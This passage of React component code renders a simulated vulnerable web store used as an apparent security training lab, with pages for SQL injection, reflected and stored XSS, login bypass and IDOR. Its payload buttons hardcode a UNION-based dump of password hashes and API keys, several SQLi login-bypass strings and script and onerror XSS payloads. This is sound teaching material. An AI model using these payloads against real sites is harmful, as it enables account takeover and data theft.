                    setTimeout(() => setNavigating(false), 120);
                  }}
                  className="rounded p-1 hover:bg-slate-200 hover:text-slate-900 transition"
                  title="Reload"
                >
                  <RefreshCw className={cn("size-3.5", navigating && "animate-spin")} />
                </button>
              </div>

              {/* URL Address Bar */}
              <div className="flex flex-1 items-center gap-2 rounded-xl border border-slate-300 bg-white px-3 py-1.5 shadow-sm">
                <Lock className={cn("size-3.5 shrink-0", activeWaf ? "text-emerald-600" : "text-amber-500")} />
                <span className="flex-1 truncate font-mono text-xs text-slate-700">
                  https://apex-cyberstore.io<span className="text-cyan-600 font-bold">{urlPath}</span>
                </span>
                <span
                  className={cn(
                    "flex items-center gap-1 text-[9px] font-bold px-2 py-0.5 rounded-md border",
                    activeWaf
                      ? "bg-emerald-50 text-emerald-700 border-emerald-300"
                      : "bg-red-50 text-red-700 border-red-300"
                  )}
                >
                  {activeWaf ? <Shield className="size-2.5" /> : <ShieldOff className="size-2.5" />}
                  {activeWaf ? "WAF PROXIED" : "UNPROTECTED"}
                </span>
              </div>
            </div>

            {/* Store Top Navigation Bar */}
            <div className="flex flex-wrap items-center justify-between border-b border-slate-200 bg-slate-50/90 px-4 py-2.5 gap-2">
              {/* Brand Logo */}
              <button
                type="button"
                onClick={() => navigateTo("home")}
                className="flex items-center gap-2.5 group text-left"
              >
                <div className="flex size-8 items-center justify-center rounded-xl bg-gradient-to-br from-cyan-600 to-blue-700 text-white font-black shadow-sm">
                  ⚡
                </div>
                <div>
                  <span className="text-sm font-extrabold tracking-tight text-slate-900 group-hover:text-cyan-700 transition">
                    Apex CyberStore
                  </span>
                  <p className="text-[8px] text-slate-500 uppercase tracking-wider font-semibold">
                    Enterprise Defense Platform
                  </p>
                </div>
              </button>

              {/* Navigation Menu Tabs */}
              <div className="flex items-center gap-1 overflow-x-auto">
                <button
                  type="button"
                  onClick={() => navigateTo("home")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "home"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <Home className="size-3.5" />
                  <span>Home</span>
                </button>

                <button
                  type="button"
                  onClick={() => navigateTo("products")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "products" || currentPage === "product-detail"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <Package className="size-3.5" />
                  <span>Products</span>
                </button>

                <button
                  type="button"
                  onClick={() => navigateTo("docs")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "docs"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <BookOpen className="size-3.5" />
                  <span>Docs</span>
                </button>

                <button
                  type="button"
                  onClick={() => navigateTo("contact")}
                  className={cn(
                    "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                    currentPage === "contact"
                      ? "bg-cyan-600 text-white shadow-sm"
                      : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                  )}
                >
                  <Mail className="size-3.5" />
                  <span>Support</span>
                </button>

                {/* ── UNLOCKED WHEN SIGNED IN ── */}
                {currentUser && (
                  <>
                    <button
                      type="button"
                      onClick={() => navigateTo("dashboard")}
                      className={cn(
                        "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                        currentPage === "dashboard"
                          ? "bg-cyan-600 text-white"
                          : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                      )}
                    >
                      <LayoutDashboard className="size-3.5" />
                      <span>Dashboard</span>
                    </button>

                    <button
                      type="button"
                      onClick={() => navigateTo("cart")}
                      className={cn(
                        "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                        currentPage === "cart"
                          ? "bg-cyan-600 text-white"
                          : "text-slate-600 hover:bg-slate-200 hover:text-slate-900"
                      )}
                    >
                      <ShoppingCart className="size-3.5" />
                      <span>Orders & Cart ({cart.length})</span>
                    </button>

                    {/* Admin Only Tools */}
                    {currentUser.role.includes("Admin") && (
                      <>
                        <button
                          type="button"
                          onClick={() => navigateTo("diagnostics")}
                          className={cn(
                            "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                            currentPage === "diagnostics"
                              ? "bg-emerald-600 text-white"
                              : "text-emerald-700 hover:bg-emerald-100"
                          )}
                        >
                          <Wrench className="size-3.5" />
                          <span>Diagnostics</span>
                        </button>

                        <button
                          type="button"
                          onClick={() => navigateTo("admin")}
                          className={cn(
                            "flex items-center gap-1.5 rounded-lg px-2.5 py-1.5 text-xs font-semibold transition-all",
                            currentPage === "admin"
                              ? "bg-amber-600 text-white"
                              : "text-amber-700 hover:bg-amber-100"
                          )}
                        >
                          <Unlock className="size-3.5" />
                          <span>Admin Vault</span>
                        </button>
                      </>
                    )}
                  </>
                )}
              </div>

              {/* User Session Bar */}
              <div className="flex items-center gap-2">
                {currentUser ? (
                  <div className="flex items-center gap-2 rounded-xl border border-slate-200 bg-white px-2.5 py-1 shadow-sm">
                    <span className="text-base">{currentUser.avatar}</span>
                    <div className="text-left leading-none">
                      <p className="text-[11px] font-bold text-slate-900">{currentUser.name}</p>
                      <p className="text-[9px] text-cyan-700 font-medium">{currentUser.role}</p>
                    </div>
                    <button
                      type="button"
                      onClick={() => {
                        setCurrentUser(null);
                        toast.info("Logged out.");
                        navigateTo("home");
                      }}
                      className="ml-1.5 text-slate-400 hover:text-red-600 transition"
                      title="Sign Out"
                    >
                      <LogOut className="size-3.5" />
                    </button>
                  </div>
                ) : (
                  <Button
                    size="sm"
                    onClick={() => navigateTo("login")}
                    className="h-8 gap-1.5 text-xs font-bold rounded-xl bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm"
                  >
                    <Key className="size-3.5" /> Sign In
                  </Button>
                )}
              </div>
            </div>

            {/* In-Browser Alert Message */}
            {siteAlert && (
              <div
                className={cn(
                  "flex items-start justify-between border-b px-4 py-2.5 text-xs transition-all",
                  siteAlert.type === "error"
                    ? "border-red-200 bg-red-50 text-red-900"
                    : siteAlert.type === "warning"
                    ? "border-emerald-200 bg-emerald-50 text-emerald-900"
                    : "border-cyan-200 bg-cyan-50 text-cyan-900"
                )}
              >
                <div className="flex items-start gap-2.5">
                  <span className="text-base">
                    {siteAlert.type === "error" ? "💥" : siteAlert.type === "warning" ? "🛡️" : "✅"}
                  </span>
                  <div>
                    <p className="font-bold">{siteAlert.title}</p>
                    <p className="text-[11px] opacity-90">{siteAlert.detail}</p>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setSiteAlert(null)}
                  className="text-slate-500 hover:text-slate-900 ml-2"
                >
                  <X className="size-3.5" />
                </button>
              </div>
            )}

            {/* Active Exploit Popout Visualizer (Shows ONLY when an attack succeeds in WAF OFF mode) */}
            {activeExploitDisplay && !activeWaf && (
              <div className="border-b-2 border-red-300 bg-red-50 p-4 transition-all animate-in fade-in">
                <div className="flex items-start justify-between">
                  <div className="flex items-center gap-2">
                    <span className="flex size-7 items-center justify-center rounded-lg bg-red-100 text-red-700 font-bold">
                      ⚠️
                    </span>
                    <div>
                      <h4 className="text-sm font-extrabold text-red-900">{activeExploitDisplay.title}</h4>
                      <p className="text-xs text-red-700">{activeExploitDisplay.description}</p>
                    </div>
                  </div>
                  <Button
                    size="sm"
                    variant="ghost"
                    className="h-7 text-xs text-red-700 hover:text-red-900"
                    onClick={() => setActiveExploitDisplay(null)}
                  >
                    Dismiss
                  </Button>
                </div>

                <div className="mt-2.5 rounded-xl border border-red-200 bg-white p-3 font-mono text-xs shadow-sm">
                  <p className="text-[10px] font-bold uppercase tracking-wider text-red-700 mb-1">
                    Captured Backend Exploit Evidence:
                  </p>
                  <pre className="overflow-x-auto text-[11px] text-slate-800 leading-relaxed font-semibold">
                    {activeExploitDisplay.evidence}
                  </pre>

                  {/* Render extracted table data if present */}
                  {Array.isArray(activeExploitDisplay.data) && (
                    <div className="mt-2 overflow-x-auto border-t border-red-100 pt-2">
                      <table className="w-full text-left text-[10px] text-slate-700">
                        <thead>
                          <tr className="border-b border-slate-200 text-red-800 font-bold">
                            <th className="py-1">Username</th>
                            <th className="py-1">Role</th>
                            <th className="py-1">Password Hash</th>
                            <th className="py-1">Exfiltrated Secret</th>
                          </tr>
                        </thead>
                        <tbody>
                          {activeExploitDisplay.data.map((row, idx) => (
                            <tr key={idx} className="border-b border-slate-100 font-mono">
                              <td className="py-1 font-bold text-cyan-800">{row.user}</td>
                              <td className="py-1 text-amber-800">{row.role}</td>
                              <td className="py-1 text-slate-500">{row.pass_hash}</td>
                              <td className="py-1 text-red-700 font-semibold">{row.secret}</td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* ═══════════════════════════════════════════════════════════════
                PAGE ROUTER: Realistic Multi-Page View
            ════════════════════════════════════════════════════════════════ */}
            <div className="min-h-[500px] max-h-[680px] overflow-y-auto bg-slate-50/50 p-5">
              {navigating ? (
                <div className="flex flex-col items-center justify-center py-28 gap-3">
                  <span className="size-8 animate-spin rounded-full border-3 border-cyan-600/30 border-t-cyan-600" />
                  <p className="text-xs text-slate-500 font-mono">Loading resource...</p>
                </div>
              ) : (
                <>
                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 1: INITIAL CLEAN PUBLIC HOME PAGE
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "home" && (
                    <div className="space-y-6">
                      {/* Hero Section */}
                      <div className="relative overflow-hidden rounded-3xl bg-gradient-to-br from-cyan-600 via-blue-600 to-indigo-700 p-7 text-white shadow-md">
                        <div className="relative z-10 max-w-lg space-y-3">
                          <div className="inline-flex items-center gap-1.5 rounded-full bg-white/20 px-3 py-1 text-[10px] font-bold text-white border border-white/30 backdrop-blur-sm">
                            🛡️ Next-Gen Zero-Trust Architecture & Threat Shield
                          </div>
                          <h1 className="text-2xl md:text-3xl font-black tracking-tight text-white">
                            Apex Cloud & Security Platform
                          </h1>
                          <p className="text-xs text-white/90 leading-relaxed font-medium">
                            Protecting enterprise cloud infrastructure with military-grade hardware authenticators,
                            edge firewalls, and AI-driven SOC telemetry.
                          </p>

                          <div className="pt-2 flex flex-wrap gap-2.5">
                            <Button
                              size="sm"
                              onClick={() => navigateTo("products")}
                              className="h-9 gap-1.5 text-xs font-bold rounded-xl bg-white text-cyan-900 hover:bg-slate-100 shadow-sm"
                            >
                              Explore Product Catalog →
                            </Button>
                            {!currentUser ? (
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => navigateTo("login")}
                                className="h-9 gap-1.5 text-xs font-bold rounded-xl border-white/40 bg-white/10 text-white hover:bg-white/20"
                              >
                                <Key className="size-3.5" /> Sign In to Portal
                              </Button>
                            ) : (
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => navigateTo("dashboard")}
                                className="h-9 gap-1.5 text-xs font-bold rounded-xl border-white/40 bg-white/10 text-white hover:bg-white/20"
                              >
                                <LayoutDashboard className="size-3.5" /> Open My Dashboard
                              </Button>
                            )}
                          </div>
                        </div>
                      </div>

                      {/* Stats Overview */}
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        {[
                          { label: "Hardware Keys Active", value: "248,000+", icon: <Key className="size-4 text-cyan-600" /> },
                          { label: "Uptime SLA", value: "99.999%", icon: <TrendingUp className="size-4 text-emerald-600" /> },
                          { label: "Threats Blocked", value: "1.4M / day", icon: <Shield className="size-4 text-amber-600" /> },
                          { label: "Enterprise Customers", value: "4,200+", icon: <Users className="size-4 text-indigo-600" /> },
                        ].map((stat, idx) => (
                          <div key={idx} className="rounded-2xl border border-slate-200 bg-white p-3.5 space-y-1 shadow-sm">
                            <div className="flex items-center justify-between">
                              <span className="text-[10px] text-slate-500 font-semibold">{stat.label}</span>
                              {stat.icon}
                            </div>
                            <p className="font-mono font-bold text-base text-slate-900">{stat.value}</p>
                          </div>
                        ))}
                      </div>

                      {/* Featured Products Teaser */}
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <h3 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                            <Package className="size-4 text-cyan-600" /> Featured Hardware & Cloud Appliances
                          </h3>
                          <button
                            type="button"
                            onClick={() => navigateTo("products")}
                            className="text-xs text-cyan-700 hover:underline font-bold"
                          >
                            View all 6 items →
                          </button>
                        </div>

                        <div className="grid grid-cols-1 md:grid-cols-3 gap-3">
                          {PRODUCTS.slice(0, 3).map((p) => (
                            <div
                              key={p.id}
                              className="rounded-2xl border border-slate-200 bg-white p-4 flex flex-col justify-between hover:border-cyan-500 transition group shadow-sm"
                            >
                              <div>
                                <div className="flex items-center justify-between">
                                  <span className="text-3xl p-2 rounded-xl bg-slate-100">{p.icon}</span>
                                  {p.badge && (
                                    <span className="rounded-full bg-cyan-50 border border-cyan-200 px-2 py-0.5 text-[8px] font-bold text-cyan-700">
                                      {p.badge}
                                    </span>
                                  )}
                                </div>
                                <h4 className="mt-3 text-xs font-bold text-slate-900 group-hover:text-cyan-700 transition">
                                  {p.name}
                                </h4>
                                <p className="mt-1 text-[10px] text-slate-500 line-clamp-2">{p.description}</p>
                              </div>
                              <div className="mt-3 pt-2.5 border-t border-slate-100 flex items-center justify-between">
                                <span className="font-mono font-extrabold text-sm text-cyan-700">
                                  ${p.price.toFixed(2)}
                                </span>
                                <Button
                                  size="sm"
                                  variant="ghost"
                                  onClick={() => {
                                    setSelectedProduct(p);
                                    navigateTo("product-detail");
                                  }}
                                  className="h-7 text-xs font-semibold text-slate-700 hover:text-slate-900"
                                >
                                  Details →
                                </Button>
                              </div>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Call-to-action to Sign In */}
                      {!currentUser && (
                        <div className="rounded-2xl border border-cyan-200 bg-cyan-50/70 p-4 flex items-center justify-between">
                          <div className="flex items-center gap-3">
                            <span className="text-2xl">🔐</span>
                            <div>
                              <p className="text-xs font-bold text-slate-900">Sign In to Access Customer & Executive Tools</p>
                              <p className="text-[10px] text-slate-600">
                                Unlocks Shopping Cart Orders, System Diagnostics Console, and Secret Executive Admin Vault.
                              </p>
                            </div>
                          </div>
                          <Button
                            size="sm"
                            onClick={() => navigateTo("login")}
                            className="h-8 text-xs font-bold bg-cyan-600 text-white hover:bg-cyan-700 rounded-xl shadow-sm"
                          >
                            Sign In Now
                          </Button>
                        </div>
                      )}
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 2: FULL PRODUCT CATALOG (SEARCH VULNERABLE TO SQLI/XSS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "products" && (
                    <div className="space-y-6">
                      <div>
                        <h2 className="text-lg font-bold text-slate-900 flex items-center gap-2">
                          <Package className="size-5 text-cyan-600" /> Product & Appliance Catalog
                        </h2>
                        <p className="text-xs text-slate-500 mt-0.5">
                          Browse all certified security authenticators and managed defense platforms.
                        </p>
                      </div>

                      {/* Search Bar & Category Filter */}
                      <div className="space-y-3">
                        <div className="flex flex-wrap gap-2 items-center justify-between">
                          <div className="relative flex-1 min-w-[240px]">
                            <Search className="absolute left-3 top-1/2 size-4 -translate-y-1/2 text-slate-400" />
                            <Input
                              value={searchQuery}
                              onChange={(e) => handleStoreSearch(e.target.value)}
                              placeholder="Search products by keyword or test exploit payload..."
                              className="h-9 pl-9 pr-8 font-mono text-xs border-slate-300 bg-white text-slate-900 focus-visible:ring-cyan-500"
                            />
                            {searchQuery && (
                              <button
                                type="button"
                                onClick={() => handleStoreSearch("")}
                                className="absolute right-2.5 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-900"
                              >
                                <X className="size-3.5" />
                              </button>
                            )}
                          </div>

                          <div className="flex items-center gap-1.5 overflow-x-auto">
                            {[
                              { id: "all", label: "All Items" },
                              { id: "tokens", label: "Tokens" },
                              { id: "hardware", label: "Hardware" },
                              { id: "cloud", label: "Cloud" },
                              { id: "software", label: "Software" },
                            ].map((cat) => (
                              <button
                                key={cat.id}
                                type="button"
                                onClick={() => setSelectedCategory(cat.id)}
                                className={cn(
                                  "rounded-lg px-2.5 py-1 text-[11px] font-semibold transition",
                                  selectedCategory === cat.id
                                    ? "bg-cyan-600 text-white shadow-sm font-bold"
                                    : "bg-white border border-slate-200 text-slate-600 hover:text-slate-900 hover:bg-slate-100"
                                )}
                              >
                                {cat.label}
                              </button>
                            ))}
                          </div>
                        </div>

                        {/* Quick Attack Injection Bar */}
                        <div className="rounded-xl border border-red-200 bg-red-50/70 p-2.5 flex flex-wrap items-center gap-2">
                          <span className="text-[10px] font-bold uppercase tracking-wider text-red-800 flex items-center gap-1">
                            <Flame className="size-3.5 text-red-600" /> Test Search Attacks:
                          </span>
                          {[
                            { label: "SQLi Union Dump", payload: "' UNION SELECT 1,username,password_hash,api_key FROM users--" },
                            { label: "Reflected XSS", payload: "<script>alert('XSS reflected on ' + document.domain)</script>" },
                            { label: "Boolean SQLi", payload: "' OR 1=1--" },
                          ].map((atk) => (
                            <button
                              key={atk.label}
                              type="button"
                              onClick={() => handleStoreSearch(atk.payload)}
                              className="rounded-md border border-red-300 bg-white px-2 py-0.5 text-[9px] font-mono text-red-700 hover:bg-red-100 transition shadow-sm"
                            >
                              {atk.label}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Product Grid */}
                      <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-4">
                        {filteredProducts.map((p) => (
                          <div
                            key={p.id}
                            className="flex flex-col justify-between rounded-2xl border border-slate-200 bg-white p-4 hover:border-cyan-500 transition group shadow-sm"
                          >
                            <div>
                              <div className="flex items-start justify-between">
                                <span className="text-3xl p-2.5 rounded-xl bg-slate-100">{p.icon}</span>
                                {p.badge && (
                                  <span className="rounded-full bg-cyan-50 border border-cyan-200 px-2 py-0.5 text-[8px] font-bold text-cyan-700">
                                    {p.badge}
                                  </span>
                                )}
                              </div>
                              <h3 className="mt-3 text-xs font-bold text-slate-900 group-hover:text-cyan-700 transition">
                                {p.name}
                              </h3>
                              <p className="mt-1 text-[10px] text-slate-500 line-clamp-2 leading-relaxed">
                                {p.description}
                              </p>
                              <div className="mt-3 flex items-center gap-1 text-[10px] text-amber-500">
                                <Star className="size-3 fill-amber-400" />
                                <span className="font-bold text-slate-900">{p.rating}</span>
                                <span className="text-slate-400">({p.reviewsCount} reviews)</span>
                              </div>
                            </div>

                            <div className="mt-4 pt-3 border-t border-slate-100 flex items-center justify-between">
                              <p className="font-mono font-extrabold text-sm text-cyan-700">${p.price.toFixed(2)}</p>
                              <div className="flex items-center gap-1.5">
                                <Button
                                  size="sm"
                                  variant="outline"
                                  onClick={() => {
                                    setSelectedProduct(p);
                                    navigateTo("product-detail");
                                  }}
                                  className="h-7 text-xs font-semibold rounded-lg border-slate-300 hover:border-cyan-600"
                                >
                                  Specs
                                </Button>
                                <Button
                                  size="sm"
                                  onClick={() => {
                                    setCart((prev) => {
                                      const exist = prev.find((item) => item.product.id === p.id);
                                      if (exist) {
                                        return prev.map((item) =>
                                          item.product.id === p.id ? { ...item, quantity: item.quantity + 1 } : item
                                        );
                                      }
                                      return [...prev, { product: p, quantity: 1 }];
                                    });
                                    toast.success(`Added ${p.name} to Cart`);
                                  }}
                                  className="h-7 px-2 rounded-lg bg-cyan-50 text-cyan-700 hover:bg-cyan-100 border border-cyan-200"
                                  title="Add to Cart"
                                >
                                  <Plus className="size-3.5" />
                                </Button>
                              </div>
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 3: PRODUCT DETAIL & REVIEWS (STORED XSS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "product-detail" && selectedProduct && (
                    <div className="space-y-6">
                      <Button
                        variant="ghost"
                        size="sm"
                        onClick={() => navigateTo("products")}
                        className="gap-1.5 text-xs text-slate-500 hover:text-slate-900 h-8"
                      >
                        <ArrowLeft className="size-3.5" /> Back to Catalog
                      </Button>

                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                        {/* Product Overview Card */}
                        <div className="md:col-span-5 rounded-2xl border border-slate-200 bg-white p-6 flex flex-col items-center text-center space-y-3 shadow-sm">
                          <span className="text-6xl p-6 rounded-3xl bg-slate-100 shadow-inner">
                            {selectedProduct.icon}
                          </span>
                          <h2 className="text-base font-bold text-slate-900">{selectedProduct.name}</h2>
                          <p className="text-xs text-slate-500">{selectedProduct.description}</p>
                          <p className="font-mono text-2xl font-black text-cyan-700">
                            ${selectedProduct.price.toFixed(2)}
                          </p>
                          <Button
                            onClick={() => {
                              setCart((prev) => [...prev, { product: selectedProduct, quantity: 1 }]);
                              toast.success(`Added to Cart`);
                              navigateTo("cart");
                            }}
                            className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-600 text-white hover:bg-cyan-700 gap-2 shadow-sm"
                          >
                            <ShoppingCart className="size-4" /> Add to Cart & Checkout
                          </Button>
                        </div>

                        {/* Specs & Reviews (Stored XSS Target) */}
                        <div className="md:col-span-7 space-y-4">
                          <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                            <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                              Technical Specifications
                            </h3>
                            <div className="grid grid-cols-2 gap-2">
                              {selectedProduct.specs.map((spec, i) => (
                                <div key={i} className="flex items-center gap-2 rounded-xl bg-slate-50 p-2.5 text-xs border border-slate-200">
                                  <CheckCircle2 className="size-3.5 text-emerald-600 shrink-0" />
                                  <span className="text-slate-700 font-medium">{spec}</span>
                                </div>
                              ))}
                            </div>
                          </div>

                          {/* Customer Reviews Box */}
                          <div className="rounded-2xl border border-slate-200 bg-white p-5 space-y-4 shadow-sm">
                            <h3 className="text-sm font-bold text-slate-900 flex items-center gap-2">
                              <MessageSquare className="size-4 text-cyan-600" />
                              Customer Reviews ({reviews.length})
                            </h3>

                            {/* Write Review Form */}
                            <div className="rounded-xl border border-slate-200 bg-slate-50 p-3 space-y-2.5">
                              <div className="flex justify-between items-center">
                                <Input
                                  value={newReviewAuthor}
                                  onChange={(e) => setNewReviewAuthor(e.target.value)}
                                  placeholder="Your Name"
                                  className="h-8 max-w-[200px] text-xs font-mono bg-white border-slate-300 text-slate-900"
                                />
                                <div className="flex items-center gap-1">
                                  {[1, 2, 3, 4, 5].map((star) => (
                                    <button
                                      key={star}
                                      type="button"
                                      onClick={() => setNewReviewRating(star)}
                                      className="p-0.5"
                                    >
                                      <Star
                                        className={cn(
                                          "size-4",
                                          star <= newReviewRating
                                            ? "text-amber-500 fill-amber-400"
                                            : "text-slate-300"
                                        )}
                                      />
                                    </button>
                                  ))}
                                </div>
                              </div>

                              <Textarea
                                value={newReviewComment}
                                onChange={(e) => setNewReviewComment(e.target.value)}
                                placeholder="Enter review or test Stored XSS (e.g. <script>alert('Stored XSS')</script>)..."
                                className="min-h-16 text-xs font-mono bg-white border-slate-300 text-slate-900 resize-none"
                              />

                              <div className="flex flex-wrap items-center gap-1.5 pt-1 border-t border-slate-200">
                                <span className="text-[9px] font-bold text-red-700 uppercase tracking-wider">
                                  XSS Payloads:
                                </span>
                                {[
                                  "<script>alert('Stored XSS in Review')</script>",
                                  "<img src=x onerror=alert('Session Stolen!')>",
                                ].map((payload) => (
                                  <button
                                    key={payload}
                                    type="button"
                                    onClick={() => setNewReviewComment(payload)}
                                    className="rounded border border-red-300 bg-red-50 px-1.5 py-0.5 font-mono text-[9px] text-red-700 hover:bg-red-100"
                                  >
                                    {payload.slice(0, 24)}...
                                  </button>
                                ))}
                                <Button
                                  size="sm"
                                  onClick={handleAddReview}
                                  className="ml-auto h-7 text-xs font-bold bg-cyan-600 text-white hover:bg-cyan-700 rounded-lg shadow-sm"
                                >
                                  Post Review
                                </Button>
                              </div>
                            </div>

                            {/* Reviews Feed */}
                            <div className="space-y-2 max-h-48 overflow-y-auto pr-1">
                              {reviews.map((rev) => (
                                <div
                                  key={rev.id}
                                  className={cn(
                                    "rounded-xl border p-3 text-xs space-y-1 transition",
                                    rev.isExploit
                                      ? "border-red-300 bg-red-50 text-red-900"
                                      : "border-slate-200 bg-white text-slate-800"
                                  )}
                                >
                                  <div className="flex items-center justify-between">
                                    <span className="font-bold flex items-center gap-1.5">
                                      <User className="size-3 text-slate-500" /> {rev.author}
                                      {rev.isExploit && (
                                        <span className="rounded bg-red-100 text-red-800 border border-red-200 px-1 py-0.2 text-[8px] font-bold">
                                          STORED XSS
                                        </span>
                                      )}
                                    </span>
                                    <span className="text-[10px] text-slate-400">{rev.date}</span>
                                  </div>
                                  <p className="font-mono text-[11px] text-slate-600">{rev.comment}</p>
                                </div>
                              ))}
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 4: SIGN IN / AUTHENTICATION (SQL INJECTION BYPASS)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "login" && (
                    <div className="max-w-md mx-auto space-y-6 py-4">
                      <div className="text-center space-y-1.5">
                        <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-cyan-100 text-cyan-700 text-xl shadow-sm border border-cyan-200">
                          🔐
                        </div>
                        <h2 className="text-lg font-bold text-slate-900">Sign In to Apex CyberStore</h2>
                        <p className="text-xs text-slate-500">
                          Authenticate your session to unlock customer orders and executive tools
                        </p>
                      </div>

                      {/* Login Form */}
                      <form
                        onSubmit={(e) => {
                          e.preventDefault();
                          const form = e.currentTarget;
                          const uname = (form.elements.namedItem("uname") as HTMLInputElement).value;
                          const pword = (form.elements.namedItem("pword") as HTMLInputElement).value;
                          handleLoginSubmit(uname, pword);
                        }}
                        className="rounded-2xl border border-slate-200 bg-white p-5 space-y-4 shadow-md"
                      >
                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">
                            Username / Email
                          </label>
                          <Input
                            name="uname"
                            defaultValue="admin'--"
                            placeholder="admin or enter SQLi bypass"
                            className="h-9 font-mono text-xs bg-white border-slate-300 text-slate-900"
                          />
                        </div>

                        <div>
                          <label className="block text-[11px] font-bold text-slate-700 mb-1">Password</label>
                          <Input
                            name="pword"
                            type="password"
                            defaultValue="password123"
                            placeholder="••••••••"
                            className="h-9 font-mono text-xs bg-white border-slate-300 text-slate-900"
                          />
                        </div>

                        <Button type="submit" className="w-full h-9 rounded-xl font-bold text-xs bg-cyan-600 text-white hover:bg-cyan-700 shadow-sm">
                          Sign In →
                        </Button>
                      </form>

                      {/* 1-Click SQLi Login Bypass Vectors */}
                      <div className="rounded-2xl border border-red-200 bg-red-50/70 p-4 space-y-2.5">
                        <p className="text-[10px] font-bold uppercase tracking-wider text-red-800 flex items-center gap-1.5">
                          <Flame className="size-3.5 text-red-600" /> 1-Click SQL Injection Bypass:
                        </p>
                        <div className="flex flex-wrap gap-1.5">
                          {[
                            "admin'--",
                            "' OR '1'='1'--",
                            "admin'/*",
                          ].map((payload) => (
                            <button
                              key={payload}
                              type="button"
                              onClick={() => handleLoginSubmit(payload, "any_pass")}
                              className="rounded-md border border-red-300 bg-white px-2 py-1 text-[10px] font-mono text-red-700 hover:bg-red-100 transition shadow-sm"
                            >
                              {payload}
                            </button>
                          ))}
                        </div>
                      </div>

                      {/* Demo User Switcher */}
                      <div className="rounded-2xl border border-slate-200 bg-white p-3.5 text-center space-y-2 shadow-sm">
                        <p className="text-[10px] font-bold text-slate-500 uppercase tracking-wider">
                          Or Sign In with Demo Credentials:
                        </p>
                        <div className="flex flex-wrap justify-center gap-2">
                          <button
                            type="button"
                            onClick={() => handleLoginSubmit("admin", "admin123")}
                            className="rounded-lg border border-slate-200 bg-slate-50 px-2.5 py-1 text-xs text-slate-800 hover:border-cyan-600 font-medium"
                          >
                            👑 Admin (admin/admin123)
                          </button>
                          <button
                            type="button"
                            onClick={() => handleLoginSubmit("jsmith", "password")}
                            className="rounded-lg border border-slate-200 bg-slate-50 px-2.5 py-1 text-xs text-slate-800 hover:border-cyan-600 font-medium"
                          >
                            💻 Developer (jsmith/password)
                          </button>
                          <button
                            type="button"
                            onClick={() => handleLoginSubmit("customer", "customer123")}
                            className="rounded-lg border border-slate-200 bg-slate-50 px-2.5 py-1 text-xs text-slate-800 hover:border-cyan-600 font-medium"
                          >
                            👤 Customer (customer/customer123)
                          </button>
                        </div>
                      </div>
                    </div>
                  )}

                  {/* ─────────────────────────────────────────────────────────────
                      PAGE 5: ORDERS & CART (IDOR ORDER LOOKUP)
                  ────────────────────────────────────────────────────────────── */}
                  {currentPage === "cart" && (
                    <div className="space-y-6">
                      <h2 className="text-lg font-bold text-slate-900 flex items-center gap-2">
                        <ShoppingCart className="size-5 text-cyan-600" />
                        Customer Orders & Invoices (IDOR Lab)
                      </h2>

                      <div className="grid grid-cols-1 md:grid-cols-12 gap-6 items-start">
                        {/* Cart Items */}
                        <div className="md:col-span-6 rounded-2xl border border-slate-200 bg-white p-5 space-y-3 shadow-sm">
                          <h3 className="text-xs font-bold uppercase tracking-wider text-slate-500">
                            Active Shopping Cart ({cart.length} items)
                          </h3>
                          {cart.map((item, idx) => (
                            <div key={idx} className="flex justify-between items-center border-b border-slate-100 pb-2.5">
                              <div className="flex items-center gap-2.5">
                                <span className="text-2xl p-1.5 rounded-lg bg-slate-100">{item.product.icon}</span>
                                <div>
                                  <p className="text-xs font-bold text-slate-900">{item.product.name}</p>
                                  <p className="text-[10px] text-slate-500">Qty: {item.quantity}</p>
                                </div>
                              </div>
